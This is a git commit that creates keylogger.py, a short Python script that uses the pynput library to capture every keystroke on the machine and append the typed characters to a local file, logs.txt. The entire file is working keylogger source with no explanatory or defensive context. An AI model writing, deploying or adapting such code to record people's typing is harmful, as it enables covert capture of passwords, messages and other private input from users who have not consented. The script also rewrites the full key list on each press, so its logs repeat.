afad098a8206b1c011bddd3daeb1cd139c3ea85f
RichardPhilRoy <84862685+RichardPhilRoy@users.noreply.github.com>
2021-06-08 11:16:10 +0530

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,25 @@
+import pynput
+from pynput.keyboard import Key,Listener
+
+count = 0
+keys = []
+
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+    write_file(keys)
+    
+def write_file(keys):
+    with open("logs.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+            
+with Listener(on_press=on_press) as listener:
+    listener.join()
